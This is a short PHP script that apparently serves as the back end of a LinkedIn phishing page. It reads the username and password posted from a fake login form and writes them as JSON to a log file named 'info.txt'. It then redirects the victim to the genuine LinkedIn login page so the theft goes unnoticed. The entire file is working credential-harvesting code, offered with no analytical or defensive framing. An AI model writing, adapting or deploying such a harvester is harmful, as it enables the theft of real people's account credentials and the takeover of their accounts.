<?php

header('Location: https://www.linkedin.com/login');
$data = array('site' => 'Linkedin',
  'user' => $_POST['session_key'],
  'pass' => $_POST['session_password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>